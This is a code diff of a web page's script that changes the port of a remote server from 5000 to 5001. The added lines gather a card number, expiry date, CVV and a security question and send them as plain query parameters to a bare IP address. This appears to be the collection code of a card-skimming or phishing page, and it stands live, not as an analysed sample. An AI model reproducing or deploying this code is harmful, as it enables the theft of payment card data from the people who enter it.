@@ -388,7 +388,7 @@
 <script>
   document.addEventListener('DOMContentLoaded', function () {
       document.getElementById('ShowInputButton').addEventListener('click', function() {
-          fetch('http://45.152.114.87:5000/test')
+          fetch('http://45.152.114.87:5001/test')
               .then(response => response.text())
               .then(data => {
                   console.log("Data received:", data);
@@ -427,7 +427,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
 
     if(question){
       console.log('question')
-      var url = "http://45.152.114.87:5000/login" +
+      var url = "http://45.152.114.87:5001/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
@@ -435,7 +435,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
               "&question=" + encodeURIComponent(question);
     } else {
       console.log('question')
-      var url = "http://45.152.114.87:5000/login" +
+      var url = "http://45.152.114.87:5001/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
